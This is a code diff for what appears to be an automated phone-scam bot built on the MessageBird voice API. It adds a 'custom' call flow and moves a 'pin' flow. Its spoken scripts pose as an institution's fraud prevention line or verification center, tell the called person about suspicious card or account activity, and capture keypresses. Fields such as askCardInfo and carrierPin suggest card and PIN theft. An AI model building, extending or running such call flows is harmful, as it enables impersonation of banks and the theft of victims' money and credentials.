@@ -18,6 +18,8 @@ interface CallInputType {
   askCardInfo?: string;
   transferNumber: string;
   pinType?: string;
+  actions?: string;
+  customMessage?: string;
 }
 
 const callFlow = (
@@ -31,6 +33,8 @@ const callFlow = (
   transferNumber?: string,
   from?: string,
   pinType?: string,
+  customMessage?: string,
+  actions?: string,
 ): CallFlowParameter => {
   switch (step) {
     case 'bank':
@@ -213,53 +217,6 @@ const callFlow = (
           },
         ],
       };
-    case 'pin':
-      return {
-        id: uuidv4(),
-        title: `call card - ${chatId}`,
-        record: false,
-        steps: [
-          {
-            id: uuidv4(),
-            action: 'say',
-            options: {
-              //@ts-expect-error this is actually a int and not a string
-              repeat: 3,
-              ifMachine: 'delay',
-              payload:
-                pinType === 'carrierPin'
-                  ? `This is a call from ${institutionName.toUpperCase()} verification center. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
-                  : `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
-              language,
-              voice: 'female',
-              length: 5,
-            },
-            onKeypressGoto: 'pinStepGoto',
-            onKeypressVar: 'dtmf',
-          },
-          {
-            // @ts-expect-error id is indeed known param
-            id: uuidv4(),
-            action: 'pause',
-            options: {
-              length: 5,
-            },
-            onKeypressGoto: 'pinStepGoto',
-            onKeypressVar: 'dtmf',
-          },
-          {
-            action: 'hangup',
-          },
-          {
-            // @ts-expect-error id is indeed known param
-            id: 'pinStepGoto',
-            action: 'fetchCallFlow',
-            options: {
-              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?pinType=${pinType}`,
-            },
-          },
-        ],
-      };
     case 'pgp':
       return {
         id: uuidv4(),
@@ -318,6 +275,87 @@ const callFlow = (
           },
         ],
       };
+    case 'pin':
+      return {
+        id: uuidv4(),
+        title: `call card - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              //@ts-expect-error this is actually a int and not a string
+              repeat: 3,
+              ifMachine: 'delay',
+              payload:
+                pinType === 'carrierPin'
+                  ? `This is a call from ${institutionName.toUpperCase()} verification center. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
+                  : `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+              language,
+              voice: 'female',
+              length: 5,
+            },
+            onKeypressGoto: 'pinStepGoto',
+            onKeypressVar: 'dtmf',
+          },
+          {
+            // @ts-expect-error id is indeed known param
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'pinStepGoto',
+            onKeypressVar: 'dtmf',
+          },
+          {
+            action: 'hangup',
+          },
+          {
+            // @ts-expect-error id is indeed known param
+            id: 'pinStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?pinType=${pinType}`,
+            },
+          },
+        ],
+      };
+    case 'custom':
+      return {
+        id: uuidv4(),
+        title: `Calling - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              //@ts-expect-error this is actually a int and not a string
+              repeat: 3,
+              payload: `${customMessage}. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
+              language: 'en-us',
+              voice: 'female',
+              length: 5,
+              loop: true,
+            },
+            onKeypressGoto: 'customNextStep',
+            onKeypressVar: 'dtmf',
+          },
+          {
+            action: 'hangup',
+          },
+          {
+            // @ts-expect-error id is indeed known param
+            id: 'customNextStep',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?actions=${actions}&customMessage=${customMessage}`,
+            },
+          },
+        ],
+      };
     default:
       return {
         // @ts-expect-error id is indeed known param
@@ -343,6 +381,8 @@ export const messagebirdMakeACall: any = async ({
   chatId,
   transferNumber,
   pinType,
+  customMessage,
+  actions,
 }: CallInputType) => {
   const flow =
     /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
@@ -359,6 +399,8 @@ export const messagebirdMakeACall: any = async ({
           transferNumber,
           from,
           pinType,
+          customMessage,
+          actions,
         )
       : callFlow(
           institutionName,
@@ -371,6 +413,8 @@ export const messagebirdMakeACall: any = async ({
           transferNumber,
           from,
           pinType,
+          customMessage,
+          actions,
         );
 
   return messagebird.calls.create(
